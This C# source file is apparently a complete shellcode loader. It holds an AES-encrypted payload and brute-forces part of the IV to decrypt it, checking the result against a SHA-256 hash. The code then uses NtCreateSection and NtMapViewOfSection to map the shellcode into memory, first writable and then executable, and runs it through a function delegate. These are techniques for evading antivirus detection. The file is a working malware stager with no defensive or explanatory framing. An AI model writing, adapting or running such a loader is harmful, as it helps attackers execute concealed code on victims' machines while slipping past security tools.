
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
namespace ze
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SECT_DATA
        {
            public Boolean isvalid;
            public IntPtr hSection;
            public IntPtr pBase;
        }
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);
        public static SECT_DATA MapLocalSectionAndWrite(byte[] ShellCode)
        {
            SECT_DATA SectData = new SECT_DATA();
            long ScSize = ShellCode.Length;
            long MaxSize = ScSize;
            IntPtr hSection = IntPtr.Zero;
            UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
            if (CallResult == 0 && hSection != IntPtr.Zero)
            {
                SectData.hSection = hSection;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            Marshal.Copy(ShellCode, 0, SectData.pBase, ShellCode.Length);
            IntPtr pScBase2 = IntPtr.Zero;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase2, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase2;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            SectData.isvalid = true;
            return SectData;
        }

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        private delegate Int32 Initialize();
        public static byte[] DecryptAES(byte[] buffer, byte[] key, byte[] iv, byte[] OGhash, int origLen)
        {
            if (buffer == null || buffer.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (key == null || key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (iv == null || key.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] test = new byte[origLen];
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(buffer))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        csDecrypt.Read(test, 0, origLen);
                        HashAlgorithm sha = SHA256.Create();
                        byte[] result = sha.ComputeHash(test, 0, origLen);
                        bool bEqual = false;
                        if (result.Length == OGhash.Length)
                        {
                            int i = 0;
                            while ((i < result.Length) && (result[i] == OGhash[i]))
                            {
                                i += 1;
                            }
                            if (i == result.Length)
                            {
                                bEqual = true;
                            }
                        }
                        if (bEqual)
                            return test;
                        else
                            return null;
                    }
                }
            }
        }
        static void Runner(byte[] data)
        {
            byte[] key = { 0xa4,0xb7,0x36,0xa0,0xaf,0xbc,0x8b,0x15,0x69,0xa1,0x8b,0xab,0xeb,0x75,0x8,0x63 };
            byte[] iv = { 0xde,0x60,0x4d,0xd8,0xfd,0x76,0xda,0xf1,0x92,0xc1,0x1d,0x55,0x62,0xba,0xa3,0x6d };
            
            byte[] OG_hash = {
               0x1a,0xbe,0x67,0xcb,0x87,0x87,0x2a,0xeb,0x99,0x24,0x15,0x3c,0xe6,0x8d,0xa8,0x6b,0x3c,0xba,0x27,0x6b,0x8d,0xc5,0xb9,0x2,0x90,0xe0,0x92,0xa7,0x36,0xf,0x5c,0x28
            };
            for (byte i = 0x01; i < 0xff; i++)
            {
                iv[14] = i;
                for (byte j = 1; j < 0xff; j++)
                {
                    iv[15] = j;
                    if (DecryptAES(data, key, iv, OG_hash, 299) != null) // OG len and encrypted len are different
                    {
                        byte[] shellcode = DecryptAES(data, key, iv, OG_hash, 299);
                        SECT_DATA LocalSect = MapLocalSectionAndWrite(shellcode);
                        if (!LocalSect.isvalid)
                        {
                            return;
                        }
                        Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
                        del();

                        return;
                    }
                }
            }
        }
        public static void Main(string[] args)
        {
            byte[] buf = new byte[304] { 
                0x92,0xd7,0xb8,0x4c,0xdc,0xd7,0x5d,0xf5,0xdf,0x98,0x35,0x56,0xe,0xb1,0x4f,0x57,0x68,0xae,0x2a,0x28,0x2a,0x59,0xab,0x31,0x98,0x39,0x12,0x1d,0x64,0x1d,0xd6,0x9a,0x3d,0xd3,0xc7,0xb6,0x36,0xc3,0x42,0x9e,0x62,0xc8,0xb2,0x0,0xc4,0xea,0xa,0x4f,0x8b,
				0xea,0x99,0x7,0x9a,0xd3,0xc6,0x85,0x83,0x1,0x16,0x8c,0x23,0xeb,0x66,0x2b,0x4f,0x63,0xe2,0x96,0x59,0x86,0x6c,0xf7,0x5e,0x51,0x87,0x67,0xc9,0xa8,0x88,0xe5,0x17,0xc4,0x12,0xd8,0x84,0xb2,0x19,0x12,0x5e,0x6a,0xe9,0xf5,0x2f,0x56,0x50,0xd6,0xda,0x83,
				0xa7,0x78,0x47,0x74,0x51,0xac,0x7a,0x57,0x12,0xbb,0x70,0xf2,0xda,0x8,0xd1,0x33,0x30,0xb1,0x8c,0xa9,0xf1,0x74,0xb0,0xea,0x43,0x9,0xa0,0x4e,0xda,0x8f,0xae,0xa9,0xd6,0x1e,0xaf,0xe2,0x11,0x4c,0xf7,0x7f,0x18,0x75,0x26,0xb9,0x74,0x72,0xb3,0x7b,0xe9,
				0xda,0x5f,0x34,0xc0,0xbe,0xa8,0x49,0xf6,0xaf,0xa,0x82,0x5b,0x91,0x15,0x62,0xf1,0x41,0x7f,0x84,0xd1,0xef,0xa6,0x4d,0xe6,0x2f,0xc1,0x6e,0xeb,0xcd,0x0,0x2c,0x1,0xed,0x9c,0x2,0xee,0xbf,0x60,0x9c,0xa5,0xa,0xec,0xaf,0x31,0xf4,0xe9,0x64,0xbd,0x1e,
				0x9c,0xdf,0x79,0x22,0x39,0xdb,0xc5,0xa3,0xa9,0xcc,0xe,0xb6,0xe8,0xd,0x3d,0x44,0x45,0x2f,0xdf,0xa8,0x19,0x8b,0x9f,0xd9,0x7b,0x42,0x5b,0xfe,0xba,0x64,0xb9,0xb2,0x63,0xde,0x38,0xda,0x26,0xa2,0xf1,0x9,0x8b,0xca,0x41,0xf4,0x27,0xc8,0xca,0x6a,0xef,
				0x65,0x69,0xa3,0x8c,0xcf,0xcf,0xdd,0x3,0xc1,0x1b,0x7,0xc6,0x55,0xeb,0x64,0xd7,0x9d,0xf4,0xe6,0x3b,0x80,0x9f,0x66,0x33,0xf1,0x2a,0xdc,0x65,0x8b,0xd7,0xc5,0xb9,0x9e,0x7e,0x89,0xa8,0x22,0xfc,0x85,0x10,0xf8,0x44,0x9d,0xba,0x1b,0x28,0x12,0x3d,0xf6,
				0x50,0xcd,0xae,0xd9,0xe4,0xa7,0xf,0xa4,0x78,0x69 
            };
            Runner(buf);
        }
    }
}
